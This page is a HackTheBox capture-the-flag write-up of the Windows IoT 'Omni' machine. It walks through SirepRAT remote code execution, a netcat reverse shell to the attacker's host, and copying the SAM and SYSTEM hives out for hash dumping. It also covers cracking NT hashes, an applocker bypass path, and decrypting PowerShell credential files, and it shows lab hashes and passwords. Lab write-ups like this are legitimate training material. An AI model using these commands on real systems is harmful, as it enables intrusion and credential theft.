<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>HTB-Windows-Easy-Omni - WriteUp HackTheBox - by JavaliMZ</title>
        <!-- Custom HTML head -->
<!-- Content here gets appended to the <html><head> of all the pages -->
<!-- Custom HTML head: Twitter support -->
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="theme/css/additional.css">
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="HTB-Windows-Easy-Omni.html">HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="HTB-Linux-Hard-Falafel.html">HTB-Linux-Hard-Falafel</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">WriteUp HackTheBox - by JavaliMZ</h1>

                    <div class="right-buttons">
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p><img src="Assets/HTB-Windows-Easy-omni/547286d87bae2e17e0694432b7e4b920.webp" alt="" /></p>
<h1 id="writeup-of-omni"><a class="header" href="#writeup-of-omni">Writeup of <em>OMNI</em></a></h1>
<h4 id="easy-machine-hacktheboxcom"><a class="header" href="#easy-machine-hacktheboxcom">Easy machine (hackthebox.com)</a></h4>
<h4 id="sylvain-javali-júlio---08092021"><a class="header" href="#sylvain-javali-júlio---08092021">Sylvain (Javali) Júlio - 08/09/2021</a></h4>
<hr />
<hr />
<h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
<p>For enumeration, after verifying the connection, I always do a nmap scan like this:</p>
<p><img src="Assets/HTB-Windows-Easy-omni/allPorts.png" alt="allPorts Scan" /> <img src="Assets/HTB-Windows-Easy-omni/nmap-A.png" alt="nmap-A" /></p>
<p>At this point, we know:</p>
<ul>
<li>Port 135 Open: MSRPC is an interprocess communication (IPC) mechanism that allows client/server software communcation</li>
<li>Port 8080 open: Basic realm=Windows Device Portal - The Windows Device Portal (WDP) is a web server included with Windows devices that lets you configure and manage the settings for the device over a network or USB connection.  Access to port 8080 from the web browser is restricted by basic authentication</li>
</ul>
<p><img src="Assets/HTB-Windows-Easy-omni/login_8080.png" alt="Login 8080" /></p>
<p>After some researches, if we google for <em>&quot;Windows Device Portal exploit github&quot;</em>, we can find this tool:</p>
<blockquote>
<p>SirepRAT - RCE as SYSTEM on Windows IoT Core - GitHub (https://github.com/SafeBreach-Labs/SirepRAT)</p>
</blockquote>
<p><img src="Assets/HTB-Windows-Easy-omni/win_IoT_Core.jpg" alt="Windows IoT Core" /></p>
<h1 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h1>
<pre><code class="language-bash">git clone https://github.com/SafeBreach-Labs/SirepRAT.git
cd SirepRAT

sudo python3 setup.py install

# The syntaxt is a bit hard... but the github page as a lot of examples...
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c echo {{userprofile}}&quot;
</code></pre>
<p>The command give us an output that looks good. But we can confirm if we have RCE with a better combo!</p>
<pre><code class="language-bash"># Listening for pings
sudo tcpdump -i tun0 icmp

# Run RCE on the target machine to ping my kali machine
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c ping 10.10.14.16&quot;
</code></pre>
<p><img src="Assets/HTB-Windows-Easy-omni/ping_RCE.png" alt="RCE Ping" /> <img src="Assets/HTB-Windows-Easy-omni/tcpdump_ping_RCE.png" alt="RCE Ping - TCPDump listener" /></p>
<p>At this point, we know we have effectively RCE. So, the next step is to get a reverse shell</p>
<ul>
<li>I tryied Certutil but don't work (don't existe)</li>
<li>I tryied with IEX but don't work too (don't exist')</li>
<li>I create a smbserver, wget a netcat (nc64.exe) on my kali</li>
<li>Prepare the listener to receive the reverse shell <em>(sudo rlwrap nc -lvnp 443)</em></li>
</ul>
<pre><code class="language-bash"># SMB Server
sudo smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support

# NC listener
sudo rlwrap nc -lvnp 443

# Get Reverse shell
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args ' /c net use \\10.10.14.16\smbFolder /u:javali javali'

python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args ' /c \\10.10.14.16\smbFolder\nc64.exe -e cmd 10.10.14.16 443'
</code></pre>
<p>We are in the target machine! </p>
<p><img src="Assets/HTB-Windows-Easy-omni/ipconfig.png" alt="ipconfig" /></p>
<h1 id="privesc"><a class="header" href="#privesc">Privesc</a></h1>
<h2 id="enumeration-of-the-system"><a class="header" href="#enumeration-of-the-system">Enumeration of the System.</a></h2>
<p>On all CTF, the objective is to get flag (close to always user.txt and root.txt)</p>
<p>If we have permitions, we can find this with a simple command:</p>
<pre><code class="language-bash">cd C:\
dir /r /s user.txt  # user.txt : C:\Data\Users\app
dir /r /s root.txt  # root.txt : C:\Data\Users\administrator

icacls C:\Data\Users\app\user.txt  # NT AUTHORITY\SYSTEM:(I)(F)
								   # BUILTIN\Administrators:(I)(F)
                                   # OMNI\app:(I)(F)

icacls C:\Data\Users\administrator\root.txt  # NT AUTHORITY\SYSTEM:(I)(F)
                                             # BUILTIN\Administrators:(I)(F)
                                             # OMNI\Administrator:(I)(F)
</code></pre>
<p>At this point, we suppose we have to migrate at the user app, or directly at administrator... We don't know what privilege we have, but we know with SAM and SYSTEM files, we can extract all NT hash from all LOCAL users of the target machine. We give a try...</p>
<pre><code class="language-bash">reg save HKLM\SYSTEM SYSTEM.bak  # The operation completed successfully.
reg save HKLM\SAM SAM.bak        # The operation completed successfully.

# Download that files with smbserver
copy .\SAM.bak \\10.10.14.16\smbFolder\SAM.bak
copy .\SYSTEM.bak \\10.10.14.16\smbFolder\SYSTEM.bak

# On kali machine, extract data
secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL
#&gt;  Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
#&gt;  
#&gt;  [*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
#&gt;  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
#&gt;  Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
#&gt;  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#&gt;  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#&gt;  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
#&gt;  sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
#&gt;  DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
#&gt;  app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
#&gt;  [*] Cleaning up...
</code></pre>
<p>Now, with all that hashes, we can try to crack them with john the ripper, and rockyou.txt</p>
<pre><code class="language-bash">echo &quot;Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::&quot; &gt; hashes

john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes
john --format=NT --show hashes  # app:mesh5143
</code></pre>
<p>I tryied to Invoke_Command with the credentials we get but dont worked... So i tried to login into the website at port 8080</p>
<p><img src="Assets/HTB-Windows-Easy-omni/http_logged.png" alt="http logged" /></p>
<p><img src="Assets/HTB-Windows-Easy-omni/RCE_website.png" alt="RCE website" /></p>
<p>We can execute commands directely with Windows Device Portal. But it's always better get a real reverse shell...
We can't do the same with smbserver, but we can transfere nc64.exe to the target. I always choose C:\Windows\System32\spool\drivers\color\ path because is nearly never blocked (applocker bypass)...</p>
<pre><code class="language-bash"># On reverse shell with user omni
copy \\10.10.14.16\smbFolder\nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe

# On website with user app
C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
</code></pre>
<h2 id="user-app"><a class="header" href="#user-app">User &quot;app&quot;</a></h2>
<p>In the home directory of &quot;app&quot;, we can see the user.txt, but we can see another strange file: iot-admin.xml.
The file looks like this:</p>
<p><img src="Assets/HTB-Windows-Easy-omni/SS-file.png" alt="ss-files" /></p>
<p>This file is a Powershell Credential. to extract the &quot;Password&quot; field, we can do that:</p>
<pre><code class="language-bash">(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
#&gt; _1nt3rn37ofTh1nGz
# This maybe is the password of administrator.
# administrator:_1nt3rn37ofTh1nGz

# with the same process (because root.txt, user.txt and iot-admin.xml are all Powershell Credentials), we can extract the user.txt flag:
(Import-CliXml -Path user.txt).GetNetworkCredential().password
# 7cfd50f6bc34db3204.............. 
</code></pre>
<p>With new credential, we can login on website as user administrator</p>
<p><img src="Assets/HTB-Windows-Easy-omni/web-administrator.png" alt="web administrator logged" /></p>
<p>Now we can get reverse shell with the same nc64.exe we download before</p>
<pre><code class="language-bash">C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
</code></pre>
<p><img src="Assets/HTB-Windows-Easy-omni/administrator-reverse-shell.png" alt="administrator reverse shell" /></p>
<p>For the flag, we use the same tecnic to extract the password of the Powershell Credential:</p>
<pre><code class="language-bash">type root.txt  # Props are the same 'UserName' and 'Password'
(Import-CliXml -Path root.txt).GetNetworkCredential().Password
#&gt; 5dbdce5569e2c47.................

</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="next" href="HTB-Linux-Hard-Falafel.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="next" href="HTB-Linux-Hard-Falafel.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
